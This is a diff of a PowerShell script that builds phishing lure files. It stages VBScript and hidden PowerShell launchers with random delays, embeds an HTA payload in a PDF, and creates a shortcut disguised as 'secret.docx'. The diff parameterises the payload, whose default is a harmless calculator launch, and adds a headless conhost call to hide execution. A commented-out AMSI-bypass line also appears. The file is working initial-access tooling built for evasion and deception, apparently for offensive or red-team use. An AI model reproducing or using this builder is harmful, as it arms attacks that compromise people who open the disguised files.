@@ -1,4 +1,11 @@
 
+param(
+    $destDir = ".\payload", 
+    $pdfFileName = "random.pdf", 
+    $lnkFileName = "secret.docx", 
+    $origninalPdf = ".\assets\random.pdf",
+    $payload = "iex calc.exe"
+)
 function Get-RandomStrings {
     param (
         [int32] $Count = 10
@@ -354,7 +361,7 @@ function New-SecondStageVBLauncher {
         $vbScript.Add((Get-RandomSleep -Min 5000 -Max 50000))
     }
     $vbScript.Add("Set objShell = CreateObject(`"WScript.Shell`"):")
-    $vbScript.Add("objShell.Run `"powershell.exe -w 1 -nop -nol -C $Payload`":")
+    $vbScript.Add("objShell.Run `"conhost.exe --headless powershell.exe -w 1 -nop -nol -C $Payload`":")
     $vbScript
 }
 
@@ -442,18 +449,16 @@ function New-LnkFile {
     $lnk.IconLocation = "%systemroot%\system32\imageres.dll,$IconNumber"
     $lnk.Save()
 }
+
 #$amsi = "[Ref]." + (New-ObfuscatedCommand "('Assembly').('GetType')") + "('System.Management.Automation.AmsiUtils')." + (New-ObfuscatedCommand "('GetField')")+"('amsiInitFailed','NonPublic,Static')"+ (New-ObfuscatedCommand ".('SetValue')(`$null,`$true)")
 #Write-Output $amsi
-$calc = "iex calc.exe"
-$psLauncher = New-PowershellLauncher -Payload $calc
+$psLauncher = New-PowershellLauncher -Payload $payload
 $secondStage = New-SecondStageVBLauncher -Payload $psLauncher
-$payload = New-FirstStageVBLauncher -Payload $secondStage
-$defaultDir = ".\payload"
-$pdfFilename = "random.pdf"
-$lnkFileName = "secret.docx"
-$origninalPdf = ".\assets\random.pdf"
-if (!(Test-Path -Path $defaultDir -PathType Container)){
-    New-Item -ItemType Directory $defaultDir
+$vbPayload = New-FirstStageVBLauncher -Payload $secondStage
+
+
+if (!(Test-Path -Path $destDir -PathType Container)){
+    New-Item -ItemType Directory $destDir
 }
-New-InsertHtaToPDF -OriginalPdf $origninalPdf -HtaPayload $payload -Dest "$($defaultDir)\$($pdfFileName)"
-New-LnkFile -Target $pdfFilename -Dest "$($defaultDir)\$($lnkFileName)" -IconNumber 340
+New-InsertHtaToPDF -OriginalPdf $origninalPdf -HtaPayload $vbPayload -Dest "$($destDir)\$($pdfFileName)"
+New-LnkFile -Target $pdfFileName -Dest "$($destDir)\$($lnkFileName)" -IconNumber 340
